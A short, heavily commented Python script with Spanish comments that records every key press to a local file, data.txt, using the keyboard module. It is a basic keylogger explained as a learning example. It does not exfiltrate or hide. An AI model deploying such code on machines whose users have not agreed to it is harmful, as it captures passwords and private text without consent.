# Es un programa que  transcribe  las pulsaciones de tu teclado

import keyboard  #Esta línea importa el módulo keyboard, que proporciona una forma simple de controlar y monitorear dispositivos de entrada.


def pressedKeys(key): # Esta línea define una función llamada pressedKeys que toma un argumento: key.
  with open('data.txt', "a") as file: #Esta línea abre un archivo llamado data.txt en modo de adición. Esto significa que cualquier dato escrito en el archivo se agregará al final del archivo, en lugar de sobrescribir los contenidos existentes.
    if key.name == 'space': #Esta línea verifica si la tecla presionada es el espacio. Si lo es, el script escribirá un carácter de espacio en el archivo.
      file.write(" ")
    else:
      file.write(key.name) #Si la tecla presionada no es el espacio, el script escribirá el nombre de la tecla en el archivo.
      
      
keyboard.on_press(pressedKeys)# Esta línea configura un detector de teclado que llama a la función pressedKeys cada vez que se presiona una tecla.
keyboard.wait() # Esta línea hace que el script espere indefinidamente por una pulsación de tecla. Esto permite que el script siga ejecutándose y transcribiendo teclas hasta que se detenga manualmente.


